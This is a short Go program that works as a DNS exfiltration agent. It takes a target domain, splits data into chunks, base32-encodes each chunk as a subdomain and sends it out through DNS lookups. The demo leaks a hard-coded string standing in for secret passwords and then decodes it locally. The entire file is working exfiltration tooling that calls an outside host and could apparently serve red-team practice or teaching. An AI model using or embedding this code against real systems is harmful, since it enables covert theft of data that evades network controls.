package main

import (
	"bytes"
	"context"
	"encoding/base32"
	"fmt"
	"io"
	"net"
	"strings"

	"github.com/alexflint/go-arg"
)

var args struct {
	Domain string `arg:"-d,--domain,required" help:"the domain to exfil data to"`
}

var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)
var encodedPayloads []string

type Agent struct {
	Domain    string
	ChunkSize int16
}

func NewAgent(domain string, chunkSize int16) *Agent {
	return &Agent{
		Domain:    domain,
		ChunkSize: chunkSize,
	}
}

func (a *Agent) Exfil(data []byte) {
	r := bytes.NewReader(data)
	chunk := make([]byte, a.ChunkSize)

	for {
		/* read in data no larger than ChunkSize */
		n, err := r.Read(chunk)
		if n == 0 || err == io.EOF {
			break
		}

		if err != nil {
			fmt.Println(err.Error())
		}

		/* encode data and format exfil subdomain*/
		ed := strings.ToLower(b32.EncodeToString(chunk[:n]))
		encodedPayloads = append(encodedPayloads, ed)
		domain := fmt.Sprintf("%s.%s", ed, a.Domain)
		fmt.Println(domain)

		/* perform DNS lookup with exfil data as subdomain*/
		resolver := net.DefaultResolver
		_, err = resolver.LookupIPAddr(context.Background(), domain)
		if err != nil {
			fmt.Println(err.Error())
		}
	}
}

func main() {
	arg.MustParse(&args)

	agent := NewAgent(args.Domain, 23)
	data := "MySuperSecretPasswordsAndNotes"
	agent.Exfil([]byte(data))

	fmt.Print("Exfiltrated Data: ")
	for _, s := range encodedPayloads {
		d, _ := b32.DecodeString(strings.ToUpper(s))
		fmt.Print(string(d))
	}
	fmt.Println()
}
